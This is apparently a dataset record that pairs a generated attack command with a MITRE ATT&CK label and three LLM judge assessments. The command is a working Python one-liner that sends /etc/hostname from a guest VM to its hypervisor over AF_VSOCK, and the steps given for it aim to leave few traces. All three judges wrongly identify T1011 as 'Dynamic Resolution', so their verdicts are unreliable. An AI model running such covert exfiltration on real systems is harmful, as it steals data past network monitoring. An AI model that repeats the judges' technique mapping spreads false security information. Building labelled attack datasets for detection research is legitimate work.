command: python3 -c "import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()"
explanation: Exfiltrates via VMCI/virtio-vsock (guest-to-host) using AF_VSOCK to avoid the IP network path entirely, consistent with T1011.
rationale_steps: Select vsock (AF_VSOCK) to leverage hypervisor-mediated transport.
Connect to host CID 2 on a nonstandard port (47419).
Read and send /etc/hostname over the vsock stream.
Close the connection to reduce residual indicators.

llm_judgments.syntactic_justification: The Python one-liner is perfectly well-formed with balanced parentheses, proper quotes, valid socket module usage, and correct method calls.
llm_judgments.semantic_justification: While the command does exfiltrate data (hostname) through an alternative channel (AF_VSOCK), it doesn't align with T1011 (Dynamic Resolution) which involves algorithmically determining network endpoints, but rather fits T1048 (Exfiltration Over Alternative Protocol).

llm_judgments.syntactic_justification: The Python command is perfectly well-formed, with balanced quotes, valid function calls, and correct argument types for the socket operations.
llm_judgments.semantic_justification: The command successfully exfiltrates data via AF_VSOCK as claimed, but it uses a fixed endpoint (2, 47419), which directly contradicts the core concept of dynamic endpoint resolution central to MITRE ATT&CK T1011.

llm_judgments.syntactic_justification: Well-formed shell quoting and valid Python one-liner with balanced parentheses and proper socket API usage.
llm_judgments.semantic_justification: It plausibly exfiltrates /etc/hostname via AF_VSOCK to the host, but performs no dynamic resolution (no DNS/DGA/endpoint rotation), so it is misaligned with the provided T1011 Dynamic Resolution description.
